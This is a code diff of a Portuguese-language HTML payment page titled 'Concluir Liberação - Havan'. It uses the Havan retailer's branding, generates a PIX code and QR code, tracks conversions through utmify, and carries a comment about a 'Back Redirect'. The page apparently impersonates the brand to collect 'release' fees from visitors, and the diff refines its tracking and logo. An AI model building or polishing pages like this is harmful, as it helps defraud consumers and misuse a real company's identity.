@@ -1,13 +1,24 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-<script>window.pixelId = window.ENV_PIXEL_ID || "67c65ea78480a2789186da08"; var a = document.createElement("script"); a.setAttribute("async", ""); a.setAttribute("defer", ""); a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js"); document.head.appendChild(a);</script><script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-subids async defer></script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Concluir Liberação - Havan</title>
     <link rel="shortcut icon" href="https://www.havan.com.br/favicon.ico" type="image/x-icon">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
     <script src="https://cdn.tailwindcss.com"></script>
+    
+    <!-- Pixel e UTM -->
+    <script>
+        window.pixelId = "67c65ea78480a2789186da08";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
+    <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-subids async defer></script>
+
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700;800&display=swap');
         body { font-family: 'Montserrat', sans-serif; background-color: #f4f4f4; }
@@ -24,8 +35,9 @@
         <span>Código PIX copiado!</span>
     </div>
 
-    <header class="bg-havan-blue flex px-6 h-20 items-center justify-center border-b-4 border-havan-yellow">
-        <img src="../../../9/images/hv-branco.png" alt="Havan" style="height: 50px; width: auto;">
+    <header class="bg-white flex px-6 h-20 items-center justify-center border-b-4 border-havan-yellow">
+        <!-- Logo Colorida para o Back Redirect -->
+        <img src="../../../assets/img/logo-havan-color.png" alt="Havan" style="height: 50px; width: auto;">
     </header>
 
     <main class="max-w-lg mx-auto mt-8 px-4">
@@ -131,7 +143,7 @@
                     transactionId = result.transactionId;
                     document.getElementById('codigo-input').value = pixCode;
                     renderQRCode(pixCode);
-                    if (window.utmify && window.trackUtmify) { window.trackUtmify("checkout", { value: AMOUNT / 100, method: "PIX", transactionId: transactionId }); }
+                    if (window.utmify && window.utmify.sendEvent) { window.utmify.sendEvent("checkout", { value: AMOUNT / 100 }); }
                     setInterval(checkStatus, 5000);
                 }
             } catch (error) { console.error(error); }
@@ -143,7 +155,7 @@
                 const response = await fetch(`${API_URL}?transactionId=${transactionId}`);
                 const result = await response.json();
                 if (result.status === 'COMPLETED') {
-                    if (window.utmify && window.trackUtmify) { window.trackUtmify("purchase", { value: AMOUNT / 100, transactionId: transactionId }); }
+                    if (window.utmify && window.utmify.sendEvent) { window.utmify.sendEvent("purchase", { value: AMOUNT / 100 }); }
                     window.location.replace(REDIRECT_URL + window.location.search);
                 }
             } catch (e) {}
